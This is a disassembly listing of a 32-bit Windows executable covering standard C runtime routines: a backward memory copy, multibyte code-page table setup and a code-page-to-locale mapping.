  409e84:	5f                   	pop    %edi
  409e85:	c9                   	leave
  409e86:	c3                   	ret
  409e87:	90                   	nop
  409e88:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  409e8c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  409e90:	f7 c7 03 00 00 00    	test   $0x3,%edi
  409e96:	75 24                	jne    0x409ebc
  409e98:	c1 e9 02             	shr    $0x2,%ecx
  409e9b:	83 e2 03             	and    $0x3,%edx
  409e9e:	83 f9 08             	cmp    $0x8,%ecx
  409ea1:	72 0d                	jb     0x409eb0
  409ea3:	fd                   	std
  409ea4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409ea6:	fc                   	cld
  409ea7:	ff 24 95 d0 9f 40 00 	jmp    *0x409fd0(,%edx,4)
  409eae:	8b ff                	mov    %edi,%edi
  409eb0:	f7 d9                	neg    %ecx
  409eb2:	ff 24 8d 80 9f 40 00 	jmp    *0x409f80(,%ecx,4)
  409eb9:	8d 49 00             	lea    0x0(%ecx),%ecx
  409ebc:	8b c7                	mov    %edi,%eax
  409ebe:	ba 03 00 00 00       	mov    $0x3,%edx
  409ec3:	83 f9 04             	cmp    $0x4,%ecx
  409ec6:	72 0c                	jb     0x409ed4
  409ec8:	83 e0 03             	and    $0x3,%eax
  409ecb:	2b c8                	sub    %eax,%ecx
  409ecd:	ff 24 85 d8 9e 40 00 	jmp    *0x409ed8(,%eax,4)
  409ed4:	ff 24 8d d0 9f 40 00 	jmp    *0x409fd0(,%ecx,4)
  409edb:	90                   	nop
  409edc:	e8 9e 40 00 08       	call   0x840df7f
  409ee1:	9f                   	lahf
  409ee2:	40                   	inc    %eax
  409ee3:	00 30                	add    %dh,(%eax)
  409ee5:	9f                   	lahf
  409ee6:	40                   	inc    %eax
  409ee7:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  409eed:	88 47 03             	mov    %al,0x3(%edi)
  409ef0:	4e                   	dec    %esi
  409ef1:	c1 e9 02             	shr    $0x2,%ecx
  409ef4:	4f                   	dec    %edi
  409ef5:	83 f9 08             	cmp    $0x8,%ecx
  409ef8:	72 b6                	jb     0x409eb0
  409efa:	fd                   	std
  409efb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409efd:	fc                   	cld
  409efe:	ff 24 95 d0 9f 40 00 	jmp    *0x409fd0(,%edx,4)
  409f05:	8d 49 00             	lea    0x0(%ecx),%ecx
  409f08:	8a 46 03             	mov    0x3(%esi),%al
  409f0b:	23 d1                	and    %ecx,%edx
  409f0d:	88 47 03             	mov    %al,0x3(%edi)
  409f10:	8a 46 02             	mov    0x2(%esi),%al
  409f13:	c1 e9 02             	shr    $0x2,%ecx
  409f16:	88 47 02             	mov    %al,0x2(%edi)
  409f19:	83 ee 02             	sub    $0x2,%esi
  409f1c:	83 ef 02             	sub    $0x2,%edi
  409f1f:	83 f9 08             	cmp    $0x8,%ecx
  409f22:	72 8c                	jb     0x409eb0
  409f24:	fd                   	std
  409f25:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409f27:	fc                   	cld
  409f28:	ff 24 95 d0 9f 40 00 	jmp    *0x409fd0(,%edx,4)
  409f2f:	90                   	nop
  409f30:	8a 46 03             	mov    0x3(%esi),%al
  409f33:	23 d1                	and    %ecx,%edx
  409f35:	88 47 03             	mov    %al,0x3(%edi)
  409f38:	8a 46 02             	mov    0x2(%esi),%al
  409f3b:	88 47 02             	mov    %al,0x2(%edi)
  409f3e:	8a 46 01             	mov    0x1(%esi),%al
  409f41:	c1 e9 02             	shr    $0x2,%ecx
  409f44:	88 47 01             	mov    %al,0x1(%edi)
  409f47:	83 ee 03             	sub    $0x3,%esi
  409f4a:	83 ef 03             	sub    $0x3,%edi
  409f4d:	83 f9 08             	cmp    $0x8,%ecx
  409f50:	0f 82 5a ff ff ff    	jb     0x409eb0
  409f56:	fd                   	std
  409f57:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409f59:	fc                   	cld
  409f5a:	ff 24 95 d0 9f 40 00 	jmp    *0x409fd0(,%edx,4)
  409f61:	8d 49 00             	lea    0x0(%ecx),%ecx
  409f64:	84 9f 40 00 8c 9f    	test   %bl,-0x6073ffc0(%edi)
  409f6a:	40                   	inc    %eax
  409f6b:	00 94 9f 40 00 9c 9f 	add    %dl,-0x6063ffc0(%edi,%ebx,4)
  409f72:	40                   	inc    %eax
  409f73:	00 a4 9f 40 00 ac 9f 	add    %ah,-0x6053ffc0(%edi,%ebx,4)
  409f7a:	40                   	inc    %eax
  409f7b:	00 b4 9f 40 00 c7 9f 	add    %dh,-0x6038ffc0(%edi,%ebx,4)
  409f82:	40                   	inc    %eax
  409f83:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  409f89:	44                   	inc    %esp
  409f8a:	8f                   	(bad)
  409f8b:	1c 8b                	sbb    $0x8b,%al
  409f8d:	44                   	inc    %esp
  409f8e:	8e 18                	mov    (%eax),%ds
  409f90:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  409f94:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  409f98:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  409f9c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  409fa0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  409fa4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  409fa8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  409fac:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  409fb0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  409fb4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  409fb8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  409fbc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  409fc3:	03 f0                	add    %eax,%esi
  409fc5:	03 f8                	add    %eax,%edi
  409fc7:	ff 24 95 d0 9f 40 00 	jmp    *0x409fd0(,%edx,4)
  409fce:	8b ff                	mov    %edi,%edi
  409fd0:	e0 9f                	loopne 0x409f71
  409fd2:	40                   	inc    %eax
  409fd3:	00 e8                	add    %ch,%al
  409fd5:	9f                   	lahf
  409fd6:	40                   	inc    %eax
  409fd7:	00 f8                	add    %bh,%al
  409fd9:	9f                   	lahf
  409fda:	40                   	inc    %eax
  409fdb:	00 0c a0             	add    %cl,(%eax,%eiz,4)
  409fde:	40                   	inc    %eax
  409fdf:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  409fe5:	c9                   	leave
  409fe6:	c3                   	ret
  409fe7:	90                   	nop
  409fe8:	8a 46 03             	mov    0x3(%esi),%al
  409feb:	88 47 03             	mov    %al,0x3(%edi)
  409fee:	8b 45 08             	mov    0x8(%ebp),%eax
  409ff1:	5e                   	pop    %esi
  409ff2:	5f                   	pop    %edi
  409ff3:	c9                   	leave
  409ff4:	c3                   	ret
  409ff5:	8d 49 00             	lea    0x0(%ecx),%ecx
  409ff8:	8a 46 03             	mov    0x3(%esi),%al
  409ffb:	88 47 03             	mov    %al,0x3(%edi)
  409ffe:	8a 46 02             	mov    0x2(%esi),%al
  40a001:	88 47 02             	mov    %al,0x2(%edi)
  40a004:	8b 45 08             	mov    0x8(%ebp),%eax
  40a007:	5e                   	pop    %esi
  40a008:	5f                   	pop    %edi
  40a009:	c9                   	leave
  40a00a:	c3                   	ret
  40a00b:	90                   	nop
  40a00c:	8a 46 03             	mov    0x3(%esi),%al
  40a00f:	88 47 03             	mov    %al,0x3(%edi)
  40a012:	8a 46 02             	mov    0x2(%esi),%al
  40a015:	88 47 02             	mov    %al,0x2(%edi)
  40a018:	8a 46 01             	mov    0x1(%esi),%al
  40a01b:	88 47 01             	mov    %al,0x1(%edi)
  40a01e:	8b 45 08             	mov    0x8(%ebp),%eax
  40a021:	5e                   	pop    %esi
  40a022:	5f                   	pop    %edi
  40a023:	c9                   	leave
  40a024:	c3                   	ret
  40a025:	cc                   	int3
  40a026:	cc                   	int3
  40a027:	cc                   	int3
  40a028:	cc                   	int3
  40a029:	cc                   	int3
  40a02a:	cc                   	int3
  40a02b:	cc                   	int3
  40a02c:	cc                   	int3
  40a02d:	cc                   	int3
  40a02e:	cc                   	int3
  40a02f:	cc                   	int3
  40a030:	55                   	push   %ebp
  40a031:	8b ec                	mov    %esp,%ebp
  40a033:	6a 0a                	push   $0xa
  40a035:	e8 e6 bb ff ff       	call   0x405c20
  40a03a:	83 c4 04             	add    $0x4,%esp
  40a03d:	6a 16                	push   $0x16
  40a03f:	e8 5c 18 00 00       	call   0x40b8a0
  40a044:	83 c4 04             	add    $0x4,%esp
  40a047:	6a 03                	push   $0x3
  40a049:	e8 92 a7 ff ff       	call   0x4047e0
  40a04e:	5d                   	pop    %ebp
  40a04f:	c3                   	ret
  40a050:	55                   	push   %ebp
  40a051:	8b ec                	mov    %esp,%ebp
  40a053:	6a 04                	push   $0x4
  40a055:	6a 00                	push   $0x0
  40a057:	8b 45 08             	mov    0x8(%ebp),%eax
  40a05a:	50                   	push   %eax
  40a05b:	e8 10 00 00 00       	call   0x40a070
  40a060:	83 c4 0c             	add    $0xc,%esp
  40a063:	5d                   	pop    %ebp
  40a064:	c3                   	ret
  40a065:	cc                   	int3
  40a066:	cc                   	int3
  40a067:	cc                   	int3
  40a068:	cc                   	int3
  40a069:	cc                   	int3
  40a06a:	cc                   	int3
  40a06b:	cc                   	int3
  40a06c:	cc                   	int3
  40a06d:	cc                   	int3
  40a06e:	cc                   	int3
  40a06f:	cc                   	int3
  40a070:	55                   	push   %ebp
  40a071:	8b ec                	mov    %esp,%ebp
  40a073:	83 ec 08             	sub    $0x8,%esp
  40a076:	8b 45 08             	mov    0x8(%ebp),%eax
  40a079:	25 ff 00 00 00       	and    $0xff,%eax
  40a07e:	89 45 08             	mov    %eax,0x8(%ebp)
  40a081:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a084:	33 d2                	xor    %edx,%edx
  40a086:	8a 91 21 f1 45 00    	mov    0x45f121(%ecx),%dl
  40a08c:	23 55 10             	and    0x10(%ebp),%edx
  40a08f:	85 d2                	test   %edx,%edx
  40a091:	75 31                	jne    0x40a0c4
  40a093:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40a097:	74 15                	je     0x40a0ae
  40a099:	8b 45 08             	mov    0x8(%ebp),%eax
  40a09c:	33 c9                	xor    %ecx,%ecx
  40a09e:	66 8b 0c 45 0e d3 45 	mov    0x45d30e(,%eax,2),%cx
  40a0a5:	00 
  40a0a6:	23 4d 0c             	and    0xc(%ebp),%ecx
  40a0a9:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40a0ac:	eb 07                	jmp    0x40a0b5
  40a0ae:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40a0b5:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40a0b9:	75 09                	jne    0x40a0c4
  40a0bb:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40a0c2:	eb 07                	jmp    0x40a0cb
  40a0c4:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40a0cb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a0ce:	8b e5                	mov    %ebp,%esp
  40a0d0:	5d                   	pop    %ebp
  40a0d1:	c3                   	ret
  40a0d2:	cc                   	int3
  40a0d3:	cc                   	int3
  40a0d4:	cc                   	int3
  40a0d5:	cc                   	int3
  40a0d6:	cc                   	int3
  40a0d7:	cc                   	int3
  40a0d8:	cc                   	int3
  40a0d9:	cc                   	int3
  40a0da:	cc                   	int3
  40a0db:	cc                   	int3
  40a0dc:	cc                   	int3
  40a0dd:	cc                   	int3
  40a0de:	cc                   	int3
  40a0df:	cc                   	int3
  40a0e0:	55                   	push   %ebp
  40a0e1:	8b ec                	mov    %esp,%ebp
  40a0e3:	83 ec 28             	sub    $0x28,%esp
  40a0e6:	6a 19                	push   $0x19
  40a0e8:	e8 83 93 ff ff       	call   0x403470
  40a0ed:	83 c4 04             	add    $0x4,%esp
  40a0f0:	8b 45 08             	mov    0x8(%ebp),%eax
  40a0f3:	50                   	push   %eax
  40a0f4:	e8 37 03 00 00       	call   0x40a430
  40a0f9:	83 c4 04             	add    $0x4,%esp
  40a0fc:	89 45 08             	mov    %eax,0x8(%ebp)
  40a0ff:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a102:	3b 0d 0c f0 45 00    	cmp    0x45f00c,%ecx
  40a108:	75 11                	jne    0x40a11b
  40a10a:	6a 19                	push   $0x19
  40a10c:	e8 ff 93 ff ff       	call   0x403510
  40a111:	83 c4 04             	add    $0x4,%esp
  40a114:	33 c0                	xor    %eax,%eax
  40a116:	e9 05 03 00 00       	jmp    0x40a420
  40a11b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40a11f:	75 1b                	jne    0x40a13c
  40a121:	e8 ea 03 00 00       	call   0x40a510
  40a126:	e8 65 04 00 00       	call   0x40a590
  40a12b:	6a 19                	push   $0x19
  40a12d:	e8 de 93 ff ff       	call   0x403510
  40a132:	83 c4 04             	add    $0x4,%esp
  40a135:	33 c0                	xor    %eax,%eax
  40a137:	e9 e4 02 00 00       	jmp    0x40a420
  40a13c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40a143:	eb 09                	jmp    0x40a14e
  40a145:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a148:	83 c2 01             	add    $0x1,%edx
  40a14b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40a14e:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp)
  40a152:	0f 83 47 01 00 00    	jae    0x40a29f
  40a158:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a15b:	6b c0 30             	imul   $0x30,%eax,%eax
  40a15e:	8b 88 08 d2 45 00    	mov    0x45d208(%eax),%ecx
  40a164:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  40a167:	0f 85 2d 01 00 00    	jne    0x40a29a
  40a16d:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40a174:	eb 09                	jmp    0x40a17f
  40a176:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40a179:	83 c2 01             	add    $0x1,%edx
  40a17c:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40a17f:	81 7d dc 01 01 00 00 	cmpl   $0x101,-0x24(%ebp)
  40a186:	73 0c                	jae    0x40a194
  40a188:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a18b:	c6 80 20 f1 45 00 00 	movb   $0x0,0x45f120(%eax)
  40a192:	eb e2                	jmp    0x40a176
  40a194:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40a19b:	eb 09                	jmp    0x40a1a6
  40a19d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40a1a0:	83 c1 01             	add    $0x1,%ecx
  40a1a3:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40a1a6:	83 7d f4 04          	cmpl   $0x4,-0xc(%ebp)
  40a1aa:	73 7b                	jae    0x40a227
  40a1ac:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a1af:	6b d2 30             	imul   $0x30,%edx,%edx
  40a1b2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a1b5:	8d 8c c2 18 d2 45 00 	lea    0x45d218(%edx,%eax,8),%ecx
  40a1bc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40a1bf:	eb 09                	jmp    0x40a1ca
  40a1c1:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a1c4:	83 c2 02             	add    $0x2,%edx
  40a1c7:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40a1ca:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a1cd:	33 c9                	xor    %ecx,%ecx
  40a1cf:	8a 08                	mov    (%eax),%cl
  40a1d1:	85 c9                	test   %ecx,%ecx
  40a1d3:	74 4d                	je     0x40a222
  40a1d5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40a1d8:	33 c0                	xor    %eax,%eax
  40a1da:	8a 42 01             	mov    0x1(%edx),%al
  40a1dd:	85 c0                	test   %eax,%eax
  40a1df:	74 41                	je     0x40a222
  40a1e1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40a1e4:	33 d2                	xor    %edx,%edx
  40a1e6:	8a 11                	mov    (%ecx),%dl
  40a1e8:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40a1eb:	eb 09                	jmp    0x40a1f6
  40a1ed:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a1f0:	83 c0 01             	add    $0x1,%eax
  40a1f3:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40a1f6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40a1f9:	33 d2                	xor    %edx,%edx
  40a1fb:	8a 51 01             	mov    0x1(%ecx),%dl
  40a1fe:	39 55 dc             	cmp    %edx,-0x24(%ebp)
  40a201:	77 1d                	ja     0x40a220
  40a203:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a206:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40a209:	8a 90 21 f1 45 00    	mov    0x45f121(%eax),%dl
  40a20f:	0a 91 00 d2 45 00    	or     0x45d200(%ecx),%dl
  40a215:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a218:	88 90 21 f1 45 00    	mov    %dl,0x45f121(%eax)
  40a21e:	eb cd                	jmp    0x40a1ed
  40a220:	eb 9f                	jmp    0x40a1c1
  40a222:	e9 76 ff ff ff       	jmp    0x40a19d
  40a227:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a22a:	89 0d 0c f0 45 00    	mov    %ecx,0x45f00c
  40a230:	c7 05 1c f0 45 00 01 	movl   $0x1,0x45f01c
  40a237:	00 00 00 
  40a23a:	8b 15 0c f0 45 00    	mov    0x45f00c,%edx
  40a240:	52                   	push   %edx
  40a241:	e8 4a 02 00 00       	call   0x40a490
  40a246:	83 c4 04             	add    $0x4,%esp
  40a249:	a3 24 f2 45 00       	mov    %eax,0x45f224
  40a24e:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40a255:	eb 09                	jmp    0x40a260
  40a257:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a25a:	83 c0 01             	add    $0x1,%eax
  40a25d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a260:	83 7d f4 06          	cmpl   $0x6,-0xc(%ebp)
  40a264:	73 1e                	jae    0x40a284
  40a266:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a269:	6b c9 30             	imul   $0x30,%ecx,%ecx
  40a26c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40a26f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a272:	66 8b 8c 41 0c d2 45 	mov    0x45d20c(%ecx,%eax,2),%cx
  40a279:	00 
  40a27a:	66 89 0c 55 10 f0 45 	mov    %cx,0x45f010(,%edx,2)
  40a281:	00 
  40a282:	eb d3                	jmp    0x40a257
  40a284:	e8 07 03 00 00       	call   0x40a590
  40a289:	6a 19                	push   $0x19
  40a28b:	e8 80 92 ff ff       	call   0x403510
  40a290:	83 c4 04             	add    $0x4,%esp
  40a293:	33 c0                	xor    %eax,%eax
  40a295:	e9 86 01 00 00       	jmp    0x40a420
  40a29a:	e9 a6 fe ff ff       	jmp    0x40a145
  40a29f:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40a2a2:	52                   	push   %edx
  40a2a3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a2a6:	50                   	push   %eax
  40a2a7:	ff 15 cc f0 40 00    	call   *0x40f0cc
  40a2ad:	83 f8 01             	cmp    $0x1,%eax
  40a2b0:	0f 85 3c 01 00 00    	jne    0x40a3f2
  40a2b6:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40a2bd:	eb 09                	jmp    0x40a2c8
  40a2bf:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40a2c2:	83 c1 01             	add    $0x1,%ecx
  40a2c5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40a2c8:	81 7d dc 01 01 00 00 	cmpl   $0x101,-0x24(%ebp)
  40a2cf:	73 0c                	jae    0x40a2dd
  40a2d1:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40a2d4:	c6 82 20 f1 45 00 00 	movb   $0x0,0x45f120(%edx)
  40a2db:	eb e2                	jmp    0x40a2bf
  40a2dd:	8b 45 08             	mov    0x8(%ebp),%eax
  40a2e0:	a3 0c f0 45 00       	mov    %eax,0x45f00c
  40a2e5:	c7 05 24 f2 45 00 00 	movl   $0x0,0x45f224
  40a2ec:	00 00 00 
  40a2ef:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  40a2f3:	0f 86 b5 00 00 00    	jbe    0x40a3ae
  40a2f9:	8d 4d e6             	lea    -0x1a(%ebp),%ecx
  40a2fc:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40a2ff:	eb 09                	jmp    0x40a30a
  40a301:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40a304:	83 c2 02             	add    $0x2,%edx
  40a307:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40a30a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40a30d:	33 c9                	xor    %ecx,%ecx
  40a30f:	8a 08                	mov    (%eax),%cl
  40a311:	85 c9                	test   %ecx,%ecx
  40a313:	74 47                	je     0x40a35c
  40a315:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40a318:	33 c0                	xor    %eax,%eax
  40a31a:	8a 42 01             	mov    0x1(%edx),%al
  40a31d:	85 c0                	test   %eax,%eax
  40a31f:	74 3b                	je     0x40a35c
  40a321:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40a324:	33 d2                	xor    %edx,%edx
  40a326:	8a 11                	mov    (%ecx),%dl
  40a328:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40a32b:	eb 09                	jmp    0x40a336
  40a32d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a330:	83 c0 01             	add    $0x1,%eax
  40a333:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40a336:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40a339:	33 d2                	xor    %edx,%edx
  40a33b:	8a 51 01             	mov    0x1(%ecx),%dl
  40a33e:	39 55 dc             	cmp    %edx,-0x24(%ebp)
  40a341:	77 17                	ja     0x40a35a
  40a343:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a346:	8a 88 21 f1 45 00    	mov    0x45f121(%eax),%cl
  40a34c:	80 c9 04             	or     $0x4,%cl
  40a34f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40a352:	88 8a 21 f1 45 00    	mov    %cl,0x45f121(%edx)
  40a358:	eb d3                	jmp    0x40a32d
  40a35a:	eb a5                	jmp    0x40a301
  40a35c:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  40a363:	eb 09                	jmp    0x40a36e
  40a365:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a368:	83 c0 01             	add    $0x1,%eax
  40a36b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40a36e:	81 7d dc ff 00 00 00 	cmpl   $0xff,-0x24(%ebp)
  40a375:	73 17                	jae    0x40a38e
  40a377:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40a37a:	8a 91 21 f1 45 00    	mov    0x45f121(%ecx),%dl
  40a380:	80 ca 08             	or     $0x8,%dl
  40a383:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a386:	88 90 21 f1 45 00    	mov    %dl,0x45f121(%eax)
  40a38c:	eb d7                	jmp    0x40a365
  40a38e:	8b 0d 0c f0 45 00    	mov    0x45f00c,%ecx
  40a394:	51                   	push   %ecx
  40a395:	e8 f6 00 00 00       	call   0x40a490
  40a39a:	83 c4 04             	add    $0x4,%esp
  40a39d:	a3 24 f2 45 00       	mov    %eax,0x45f224
  40a3a2:	c7 05 1c f0 45 00 01 	movl   $0x1,0x45f01c
  40a3a9:	00 00 00 
  40a3ac:	eb 0a                	jmp    0x40a3b8
  40a3ae:	c7 05 1c f0 45 00 00 	movl   $0x0,0x45f01c
  40a3b5:	00 00 00 
  40a3b8:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40a3bf:	eb 09                	jmp    0x40a3ca
  40a3c1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40a3c4:	83 c2 01             	add    $0x1,%edx
  40a3c7:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40a3ca:	83 7d f4 06          	cmpl   $0x6,-0xc(%ebp)
  40a3ce:	73 0f                	jae    0x40a3df
  40a3d0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40a3d3:	66 c7 04 45 10 f0 45 	movw   $0x0,0x45f010(,%eax,2)
  40a3da:	00 00 00 
  40a3dd:	eb e2                	jmp    0x40a3c1
  40a3df:	e8 ac 01 00 00       	call   0x40a590
  40a3e4:	6a 19                	push   $0x19
  40a3e6:	e8 25 91 ff ff       	call   0x403510
  40a3eb:	83 c4 04             	add    $0x4,%esp
  40a3ee:	33 c0                	xor    %eax,%eax
  40a3f0:	eb 2e                	jmp    0x40a420
  40a3f2:	83 3d 4c de 45 00 00 	cmpl   $0x0,0x45de4c
  40a3f9:	74 18                	je     0x40a413
  40a3fb:	e8 10 01 00 00       	call   0x40a510
  40a400:	e8 8b 01 00 00       	call   0x40a590
  40a405:	6a 19                	push   $0x19
  40a407:	e8 04 91 ff ff       	call   0x403510
  40a40c:	83 c4 04             	add    $0x4,%esp
  40a40f:	33 c0                	xor    %eax,%eax
  40a411:	eb 0d                	jmp    0x40a420
  40a413:	6a 19                	push   $0x19
  40a415:	e8 f6 90 ff ff       	call   0x403510
  40a41a:	83 c4 04             	add    $0x4,%esp
  40a41d:	83 c8 ff             	or     $0xffffffff,%eax
  40a420:	8b e5                	mov    %ebp,%esp
  40a422:	5d                   	pop    %ebp
  40a423:	c3                   	ret
  40a424:	cc                   	int3
  40a425:	cc                   	int3
  40a426:	cc                   	int3
  40a427:	cc                   	int3
  40a428:	cc                   	int3
  40a429:	cc                   	int3
  40a42a:	cc                   	int3
  40a42b:	cc                   	int3
  40a42c:	cc                   	int3
  40a42d:	cc                   	int3
  40a42e:	cc                   	int3
  40a42f:	cc                   	int3
  40a430:	55                   	push   %ebp
  40a431:	8b ec                	mov    %esp,%ebp
  40a433:	c7 05 4c de 45 00 00 	movl   $0x0,0x45de4c
  40a43a:	00 00 00 
  40a43d:	83 7d 08 fe          	cmpl   $0xfffffffe,0x8(%ebp)
  40a441:	75 12                	jne    0x40a455
  40a443:	c7 05 4c de 45 00 01 	movl   $0x1,0x45de4c
  40a44a:	00 00 00 
  40a44d:	ff 15 d4 f0 40 00    	call   *0x40f0d4
  40a453:	eb 32                	jmp    0x40a487
  40a455:	83 7d 08 fd          	cmpl   $0xfffffffd,0x8(%ebp)
  40a459:	75 12                	jne    0x40a46d
  40a45b:	c7 05 4c de 45 00 01 	movl   $0x1,0x45de4c
  40a462:	00 00 00 
  40a465:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  40a46b:	eb 1a                	jmp    0x40a487
  40a46d:	83 7d 08 fc          	cmpl   $0xfffffffc,0x8(%ebp)
  40a471:	75 11                	jne    0x40a484
  40a473:	c7 05 4c de 45 00 01 	movl   $0x1,0x45de4c
  40a47a:	00 00 00 
  40a47d:	a1 90 de 45 00       	mov    0x45de90,%eax
  40a482:	eb 03                	jmp    0x40a487
  40a484:	8b 45 08             	mov    0x8(%ebp),%eax
  40a487:	5d                   	pop    %ebp
  40a488:	c3                   	ret
  40a489:	cc                   	int3
  40a48a:	cc                   	int3
  40a48b:	cc                   	int3
  40a48c:	cc                   	int3
  40a48d:	cc                   	int3
  40a48e:	cc                   	int3
  40a48f:	cc                   	int3
  40a490:	55                   	push   %ebp
  40a491:	8b ec                	mov    %esp,%ebp
  40a493:	51                   	push   %ecx
  40a494:	8b 45 08             	mov    0x8(%ebp),%eax
  40a497:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a49a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a49d:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
  40a4a3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40a4a6:	83 7d fc 12          	cmpl   $0x12,-0x4(%ebp)
  40a4aa:	77 2e                	ja     0x40a4da
  40a4ac:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a4af:	33 d2                	xor    %edx,%edx
  40a4b1:	8a 90 f4 a4 40 00    	mov    0x40a4f4(%eax),%dl
  40a4b7:	ff 24 95 e0 a4 40 00 	jmp    *0x40a4e0(,%edx,4)
  40a4be:	b8 11 04 00 00       	mov    $0x411,%eax
  40a4c3:	eb 17                	jmp    0x40a4dc
  40a4c5:	b8 04 08 00 00       	mov    $0x804,%eax
  40a4ca:	eb 10                	jmp    0x40a4dc
  40a4cc:	b8 12 04 00 00       	mov    $0x412,%eax
  40a4d1:	eb 09                	jmp    0x40a4dc
  40a4d3:	b8 04 04 00 00       	mov    $0x404,%eax
  40a4d8:	eb 02                	jmp    0x40a4dc
  40a4da:	33 c0                	xor    %eax,%eax
  40a4dc:	8b e5                	mov    %ebp,%esp
  40a4de:	5d                   	pop    %ebp
  40a4df:	c3                   	ret
  40a4e0:	be a4 40 00 c5       	mov    $0xc50040a4,%esi
  40a4e5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a4e6:	40                   	inc    %eax
